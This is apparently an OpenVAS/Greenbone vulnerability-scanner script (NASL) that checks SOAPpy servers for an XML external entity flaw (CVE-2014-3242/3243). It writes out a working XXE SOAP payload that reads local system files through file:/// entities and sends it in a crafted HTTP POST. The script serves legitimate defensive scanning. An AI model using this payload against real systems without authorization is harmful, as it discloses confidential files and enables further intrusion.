# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105017");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2014-3242", "CVE-2014-3243");
  script_name("SOAPpy XML External Entities Information Disclosure Vulnerability");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-05-06 11:10:06 +0200 (Tue, 06 May 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("SOAPpy/banner");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"An attacker can exploit this issue to obtain sensitive information,
 this may lead to further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST XXE request and check the response.");

  script_tag(name:"insight", value:"Processing of an external entity containing tainted data may lead to
 disclosure of confidential information and other system impacts.");

  script_tag(name:"solution", value:"Ask the vendor for an update.");

  script_tag(name:"summary", value:"SOAPpy is prone to an information-disclosure
 vulnerability");

  script_tag(name:"affected", value:"SOAPpy 0.12.5 and prior are vulnerable.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port( default:80 );

banner = http_get_remote_headers( port:port );
if( "SOAPpy" >!< banner ) exit( 0 );

files = traversal_files();

useragent = http_get_user_agent();
host = http_host_name( port:port );

foreach file ( keys ( files ) )
{
  soap = '<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE v1 [
   <!ENTITY xxe SYSTEM "file:///' + files[file] + '">
  ]>
  <SOAP-ENV:Envelope
    SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:xsd="http://www.w3.org/1999/XMLSchema">
  <SOAP-ENV:Body>
  <echo SOAP-ENC:root="1">
  <v1 xsi:type="xsd:string">&xxe;</v1>
  </echo>
  </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>';

  len = strlen( soap );

  req = 'POST / HTTP/1.0\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Content-type: text/xml; charset="UTF-8"\r\n' +
        'Content-length: ' + len + '\r\n' +
        'SOAPAction: "echo"\r\n' +
        '\r\n' +
        soap;
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( pattern:file, string:buf ) )
  {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
